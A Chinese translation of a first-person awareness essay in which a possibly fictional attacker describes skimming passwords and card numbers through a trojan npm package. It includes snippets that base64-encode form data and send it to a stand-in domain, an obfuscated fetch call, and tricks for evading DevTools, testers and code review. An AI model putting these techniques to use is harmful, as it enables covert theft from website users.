# 我是如何从你的网站盗取银行卡和密码的
> 译者：本文翻译自[hackermoon上的文章](https://hackernoon.com/im-harvesting-credit-card-numbers-and-passwords-from-your-site-here-s-how-9a8cb347c5b5)，希望本文能唤起广大前端工作者的安全意识，以下为正文:

*** 

> 以下是一个真实的故事。或者它可能只是基于一个真实的故事。也许这根本不是真的。

这是一个疯狂的安全恐慌周——似乎每天都有一个新的漏洞。当家里人询问我相关的事情时，我需要假装我很懂行，这真的让我感到很煎熬。

看到与我亲近的人都在忧虑“被盗窃”，这确实让我有所感触。

所以，我怀着沉重的心情，决定干净利落地告诉你，我过去几年是如何偷你的网站上的用户名，密码和信用卡号码。

***

恶意代码本身非常简单，当它在满足以下条件的页面上运行时，它就能发挥作用：

* 该页面有一个\<form>标签
* 一个input[type="password"]元素，或者name属性为"cardnumber"或"cvc"的元素等
* 该页面包含“信用卡”，“结账”，“登录”，“密码”等字样。

然后，当密码/信用卡字段上出现"blur"事件或form标签上监听到"submit"事件时，我的代码：

* 获取页面上的所有表单字段（document.forms.forEach(…)）
* 获取document.cookie
* 将这些信息变成随机的字符串：
```jsx
 const payload = btoa(JSON.stringify(sensitiveUserData))
```
* 然后将其发送到`https://legit-analytics.com?q=${payload}`（当然这不是真正的域名）

简而言之，只要是看起来对我有价值的数据，我就会把它发送到我的服务器。

***

2015年时，当我第一次编写这段代码时，它毫无用处，只能躲在我电脑里。我需要把它散布到这个世界，进入你的网站。

用Google的一句话：如果攻击者成功注入了任何代码，那么游戏结束了！

XSS规模太小，而且已经被针对保护得很好了。

Chrome扩展程序也是被限制地死死的。

幸运的是，我们生活在一个人人都使用npm的时代，就像他们磕止痛药一样。

*** 

所以，npm是我的散布方法。我需要创造一些有用的开源软件，让人们不假思索地安装——我的特洛伊木马。

人们喜欢漂亮的颜色 - 这是我们与狗之间的区别 - 所以我写了一个包，让你以任何颜色登录控制台。

![图片](https://github.com/luke93h/git-blog/blob/master/imgs/console.png?raw=true)

我很兴奋 - 我有一个引人注目的npm包 - 但我不想等待人们慢慢发现，并传播这个包。所以我开始为现有的包添加PR，将我的彩色包添加到它们的依赖项中。

我为数百个前端包或者他们的依赖项添加PR（当然是用各种用户帐户，而不是全用“David Gilbertson”这个用户名）：“嘿，我已经解决了问题x，并且还添加了一些日志记录。”

看，我正在为开源做贡献！

有很多敏感的人告诉我，他们不想要新的依赖，但这是能预期的，这是一个数字游戏。

总体而言，我取得了巨大成功，我的彩色控制台代码现在23个软件包依赖。其中一个软件包本身被广泛的依赖 - 我的摇钱树。我不会说出它的名字，但你可以说它是在填充我的金库。

这只是一个包。我还有其他6个包正在运作着。

我现在每月大约被下载120,000次，我很自豪地宣布，我那些可恶的代码每天都在数千个网站上执行，包括少数Alexa-top上前1000网站，它们向我发送大量用户名，密码和信用卡明细。

***

回顾那些黄金岁月，我无法相信人们为了将跨站代码放入单个站点而花费大量精力。在我的前端朋友的帮助下，我将恶意代码发送到数千个网站非常容易。

<h1>你可能会对我的盗窃提出一些疑问......</h1>

<h2>我注意到了发出的网络请求！</h2>

你会在哪里注意到它们？当DevTools打开时，我的代码不会发送任何内容（即使没有被展开）。

我把这称为海森堡机动：如果你试图观察我代码的行为，我代码的行为将会发生改变。

在localhost或任何IP地址上运行时，或者域名中包含dev，test，qa，uat或staging（由\b字边界包围）等字样时，它也保持静默。

<h2>但渗透测试人员会在他们的HTTP请求监控工具中看到它！</h2>

他们几个小时工作？我的代码在工作日的早上7点到晚上7点之间没有发送任何内容。我的收获减半了，但减少了95％被抓的机会。

而且，你的凭证我只需要一次。因此，我在一台设备上发起请求后，我记下了它（本地存储和cookie），该设备再也不会发起请求过。

即使有一些勤奋的测试人员不断地（在周末）清除cookie和本地存储，我也只是间歇性地发送这些请求（大约七次，轻微随机化 ）。

此外，该网址看起来很像您网站对其他300个广告发起的网络请求。

也许你有一个自动测试程序，每周7天每天24小时填写付款表格并检查可疑的网络请求。你好。您使用的是PhantomJS，Selenium，W​​ebDriver还是friends？抱歉，它们都为窗口添加了易于检测的属性，因此在检测到后，我不会发送任何内容。

关键是，仅仅因为你没有看到它，并不意味着它没有发生。这已经两年多了，据我所知，至今为止没有任何人注意到我的请求。也许它一直在你的网站上:)

（有趣的是，当我查看我收集的所有密码和信用卡号码，并将它们捆绑起来在黑暗网上出售时，我必须过滤我自己的信用卡号码和用户名，以防我出卖了我自己。真是讽刺！）

<h2>我会在你的GitHub源代码中看到它！</h2>

你的单纯温暖了我的心。

但是很遗憾，将一个版本的代码发送到GitHub，并将其他版本发送到npm是完全可行的。

在我的package.json中，我将files属性指向包含压缩代码的lib文件夹 - 这是npm publish命令将发送给npm服务器的文件夹。但是lib在我的.gitignore中，它永远不会被推送到GitHub。这是一种很常见的做法，因此如果您在GitHub上阅读这些文件，它看起来一点都不可疑。

这不是一个npm问题，即使我没有向npm和GitHub推送不同的代码，谁能保证你所看到的/lib/package.min.js是/src/package.js压缩后的真正结果？

所以很抱歉，你不会在GitHub上的任何地方找到我那可恶的代码。

<h2>我读了node_modules中所有压缩后的源码！</h2>

好了，现在你只是在单纯的找茬。但也许你认为你可以写一些聪明的代码，自动检查代码是否有任何可疑之处。

你仍然不会在我的源代码中发现任何有意义的东西，在我代码中的任何地方fetch或XMLHttpRequest 任何地方，或者我要发送到的域名。我的fetch代码如下所示：

```jsx
const i = 'gfudi';
const k = s => s.split('').map(c => String.fromCharCode(c.charCodeAt() - 1)).join('');
self[k(i)](urlWithYourPreciousData);
```

“gfudi”只是“fetch”，每个字母向前移动一位。解密方法就在上面。self只是window的别名。

你也可以用self['\u0066\u0065\u0074\u0063\u0068'](...)来表示fetch(...)。

重点是：你更本没有任何机会，在混淆的代码中发现可疑的代码。

（尽管如此，实际上我并没有使用平凡的fetch，如果可以，我更喜欢用new EventSource(urlWithYourPreciousData)。这样即使你是偏执狂并通过使用serviceWorker听取fetch事件来监控出站请求，我也会紧接着。我只是不为支持serviceWorker但不支持的浏览器发送任何内容EventSource。）

